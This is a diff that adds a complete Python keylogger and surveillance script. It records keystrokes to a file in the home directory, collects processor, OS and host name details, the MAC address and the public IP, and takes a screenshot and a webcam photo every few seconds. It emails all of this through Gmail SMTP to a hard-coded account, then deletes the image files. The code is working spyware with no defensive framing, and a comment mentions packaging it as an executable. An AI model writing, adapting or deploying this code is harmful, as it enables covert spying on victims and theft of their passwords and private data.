@@ -1,0 +1,164 @@
+from pynput.keyboard import Key, Listener
+import pyautogui
+import socket
+import time
+import cv2
+import os
+import smtplib, ssl
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+from email.mime.multipart import MIMEMultipart
+from uuid import getnode as mac
+import platform as pf
+import requests
+import re
+
+''' Couldn't make exe file without this libraries '''
+# import PIL
+# import pynput
+# from email import encoders
+# from pynput.keyboard import Key
+
+
+count = 0
+keys = []
+
+directoire = os.path.expanduser('~') + '/'
+
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    if count >= 10:
+        write_file(keys)
+        keys = []
+
+
+def write_file(keys):
+    global directoire
+
+    filename = str('log.txt')
+    files = directoire + filename
+
+    with open(files, 'a') as file :
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                file.write("   ")
+            elif k.find("Key") == -1:
+                file.write(k)
+            if k.find("enter") > 0:
+                file.write("\n")
+
+
+def connected():
+    try:
+        socket.create_connection(("www.google.com", 80))
+        return True
+    except OSError:
+        pass
+    return False
+
+
+def main(key):
+    on_press(key)
+
+
+directoire1 = os.path.expanduser('~')
+
+
+def INFO():
+    processor = pf.processor()
+    name_sys = pf.system() + " " + pf.release()
+    net_pc = pf.node()
+    global pc_config
+    global directoire1
+
+    pc_config = f'''
+
+    Processor : { processor }\n
+    System name : { name_sys }\n
+    Network name : { net_pc }\n
+
+    '''
+
+    file = open(directoire1 + '/log.txt', "w")
+    file.write(pc_config)
+    file.close()
+
+INFO()
+
+
+def SEND_MAIL():
+    port = 587
+    smtp_server = "smtp.gmail.com"
+    sender_email = "myemail@gmail.com"
+    receiver_email = "myemail@gmail.com"
+    password = "mypassword"
+
+    mac_id = ':'.join(re.findall('..', '%012x' % mac()))
+
+    ip_id = requests.get('https://ramziv.com/ip').text
+
+
+    msg  = MIMEMultipart()
+    msg['Subject'] = "MAC address: " + mac_id + "---" + "IP address: " + ip_id
+    msg['From'] = 'pip install email'
+
+    try:
+        with open(directoire1 + '/log.txt') as fp:
+            file = MIMEText(fp.read())
+            fp.close()
+    except (FileNotFoundError, UnboundLocalError):
+        pass
+
+    img_data = open(directoire1 + '/screenshot.png', 'rb').read()
+    poto = MIMEImage(img_data, 'png')
+    
+    try:
+        img_dataWEB = open(directoire1 + '/screenshotWEB.png', 'rb').read()
+        potoWEB = MIMEImage(img_dataWEB, 'png')
+        msg.attach(potoWEB)
+        
+    except (FileNotFoundError, UnboundLocalError):
+        pass
+    
+    msg.attach(file)
+    msg.attach(poto)
+    
+
+    context = ssl.create_default_context()
+    server = smtplib.SMTP(smtp_server, port)
+    server.starttls(context=context)
+    server.login(sender_email, password)
+    server.sendmail(sender_email, receiver_email, msg.as_string())
+
+
+def web_screenshot():
+    cap = cv2.VideoCapture(0)
+
+    for i in range(30):
+        cap.read()
+    ret, frame = cap.read()
+    cv2.imwrite(directoire + 'screenshotWEB.png', frame)
+
+    cap.release()
+
+
+if __name__ == '__main__':
+    with Listener(on_press = main, ) as listener:
+        while True:
+            time.sleep(5)
+            screen = pyautogui.screenshot(directoire + 'screenshot.png')
+            web_screenshot()
+            if connected() == True:
+                SEND_MAIL()
+            if connected() == False:
+                pass
+            os.remove(directoire + 'screenshot.png')
+            try:
+                os.remove(directoire + 'screenshotWEB.png')
+            except FileNotFoundError:
+                pass
+        listener.join()
